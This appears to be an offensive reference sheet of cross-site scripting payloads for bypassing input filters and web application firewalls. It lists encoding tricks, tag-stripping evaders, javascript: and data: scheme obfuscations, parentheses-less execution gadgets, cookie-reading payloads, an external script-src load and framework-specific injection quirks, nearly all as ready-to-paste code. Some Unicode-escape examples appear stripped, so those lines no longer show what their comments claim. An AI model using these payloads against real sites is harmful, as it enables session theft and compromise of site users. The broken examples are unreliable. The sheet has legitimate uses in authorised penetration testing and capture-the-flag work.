# XSS filter/WAF bypass arsenal — Open WHEN: a basic XSS probe is reflected but blocked, stripped, or HTML-encoded and you need alternate tag/event/encoding/parentheses-less forms

Body already covers: case variation, nested-tag `<scrscriptipt>`, `String.fromCharCode`,
`/XSS/.source`, `eval(atob())`, `top['al'+'ert']`, tagged-template `` alert`1` ``,
autofocus/onfocus, details/ontoggle, and the per-vendor WAF table. Everything below is
additional and non-overlapping.

## Tag/attribute separator substitution (when space between tag and attr is filtered)
Replace the space after the tag name with any of these:
```
/        /*%00/        /%00*/       %2F      %0D      %0C      %0A      %09
<svg/onload=alert(1)>          <svg%09onload=alert(1)>          <svg%0Conload=alert(1)>
<img/src=x/onerror=alert(1)>
```

## Chars allowed BETWEEN the `onevent` name and `=` (per browser)
```
IExplorer: %09 %0B %0C %20 %3B          Chrome: %09 %20 %28 %2C %3B
Safari:    %2C %3B                       Firefox: %09 %20 %28 %2C %3B
Opera:     %09 %20 %2C %3B               Android: %09 %20 %28 %2C %3B
<svg onload%09=alert(1)>     <svg %09onload=alert(1)>     <svg onload%09%20%28%2c%3b=alert(1)>
```

## Tag-stripping / parser-confusion evaders (when the filter deletes the first match only)
```
<script><script>                                  <SCRscriptIPT>alert(1)</SCRscriptIPT>
<<script>alert("XSS");//<</script>                <</script/script><script>
<svg><x><script>alert('1'&#41</x>                 <script/random>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>                 <script ~~~>confirm(1)</script ~~~>
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```

## Custom tag + fragment-focus auto-fire (no allowed standard tag)
End the URL with `#x` so the browser focuses the element and `onfocus` fires on load:
```
/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

## Tiny / unicode-collapse payloads (length-limited fields)
```
<svg/onload=alert``>          <script src=//aa.es>          <script src=//℡㏛.pw>
```
`℡㏛` are two unicode chars that decompose to `telsr` — useful where the host is length-capped.

## HTML-entity decode inside attribute event values (decoded at runtime)
Any HTML-encode form is valid inside `onX="..."` and `href="javascript:..."`:
```
&apos;-alert(1)-&apos;        &#x27-alert(1)-&#x27        &#x00027-alert(1)-&#x00027
&#39-alert(1)-&#39            &#00039-alert(1)-&#00039
<a href="&#106;avascript:alert(2)">a</a>      <a href="jav&#x61script:alert(3)">a</a>
```
URL-encode also survives an attribute reflection:
```
<a href="https://x/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```

## `javascript:` scheme obfuscation (href/src/formaction/action sinks)
```
JavaSCript:alert(1)            javascript:%61%6c%65%72%74%28%31%29
javascript&colon;alert(1)     javascript&#x003A;alert(1)     javascript&#58;alert(1)
java%0ascript:alert(1)        java%09script:alert(1)         java%0dscript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)            javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```
Hex/octal inside `iframe src` (declares whole tags):
```
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e'/>
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'/>
```

## `data:` scheme variants (object/embed/iframe/script-src)
```
data:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
<object data="data:text/html,<script>alert(5)</script>">
<iframe srcdoc="<svg onload=alert(4);>">
```

## Unicode-escaped identifiers (defeat string-match keyword filters; compile identically)
```
alert(1)                              // alert(1)
eval(atob('BASE64'))   // eval(atob('...'))
alert(1)     alert`1`     top['al\145rt'](1)     top['al\x65rt'](1)
```

## JS-string builders (when quotes/keywords are stripped)
```
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"                      "\a\l\ert\(1\)"
"\x74\x68\x69\x73"  (hex)         "\164\150\151\163" (octal)   "th" (unicode)
atob("dGhpc2lzYXN0cmluZw==")     eval(8680439..toString(30))(983801..toString(36))
```

## Parentheses-less execution (when `(` `)` are blocked) — beyond the body's `` alert`1` ``
```
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`           eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`               [].map.call`${eval}\\u{61}lert\x281337\x29`
Function`x${'alert(1337)'}x`
Reflect.apply.call`${alert}${window}${[1337]}`
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}`
"a".replace.call`1${/./}${alert}`
valueOf=alert;window+''            toString=alert;window+''
onerror=eval;throw"=alert\x281\x29";            {onerror=eval}throw"=alert(1)"
throw onerror=alert,1337                         try{throw onerror=alert}catch{throw 1}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
<svg><animate onbegin=alert() attributeName=x></svg>
```

## Indirect-function-call gadgets (filter blocks `alert(...)` literal)
```
eval('ale'+'rt(1)')         Function('ale'+'rt(10)')``        [].constructor.constructor("alert(document.domain)")``
import('data:text/javascript,alert(1)')     with(document)alert(cookie)
window['alert'](0)  parent['alert'](1)  self['alert'](2)  top['alert'](3)
[1].find(alert)  [7].map(alert)  [9].every(alert)  [10].filter(alert)  [12].forEach(alert)
top[/al/.source+/ert/.source](1)            top[8680439..toString(30)](1)
new Function`al\ert\`6\``;                   Set.constructor('ale'+'rt(13)')();
import("fs").then(m=>m.readFileSync("/flag.txt","utf8"))   // node/server-side JS sandboxes
```

## JS newline / comment / whitespace separators (inside JS-context injection)
```
//comment   /* multi */   <!--   -->   #!     (line/block comment terminators)
JS-valid newlines: \n(0x0a) \r(0x0d)    
valid whitespace codepoints: 9,10,11,12,13,32,160,5760,8192-8202,8232,8233,8239,8287,12288,65279
<img/src/onerror=alert&#65279;(1)>          // U+FEFF zero-width space between alert and (
```

## Special-character / parser quirk combos (rotate through when others fail)
```
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>          <svg id=x;onload=alert(1)>          <svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
(function(x){this[x+`ert`](1)})`al`
document['default'+'View'][`alert`](3)
<script x>alert('XSS')<script y>            </style></scRipt><scRipt>alert(1)</scRipt>
```

## Heavy obfuscators (when keyword/charset filters are severe)
JSFuck (`[]()!+` only), jjencode, aaencode, katakana — generate offline. The `[]\`+!${}`
charset alone is Turing-complete for JS. Use when WAF allow-lists exclude all alpha.

## Server-side / framework-specific reflection quirks
- **Ruby-on-Rails mass assignment**: `contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa` → RoR re-quotes the key and injects `onfocus`.
- **PHP `FILTER_VALIDATE_EMAIL` bypass**: `"><svg/onload=confirm(1)>"@x.y` passes email validation yet carries markup.
- **`String.replace` special patterns**: when `"...{{t}}...".replace("{{t}}", input)` is used, `$'` `$\`` `$&` in `input` expand to surrounding text — e.g. `JSON.stringify({"name":"$'$\`alert(1)//"})` escapes a JSON-in-script context.
- **302 redirect body XSS**: browsers ignore the body of a 302, but `Location:` protocols `mailto://`, `//x:1/`, `ws://`, `wss://`, empty header, `resource://` can make the body execute.

## WASM/Emscripten linear-memory template overwrite → DOM XSS
When the app is Emscripten/WASM, format-string stubs (e.g. `"<article><p>%.*s</p></article>"`)
live in writable linear memory. An in-WASM overflow that redirects a write can rewrite the
stub to `"<img src=1 onerror=%.*s>"`, turning sanitized input into an event-handler value on
next render.
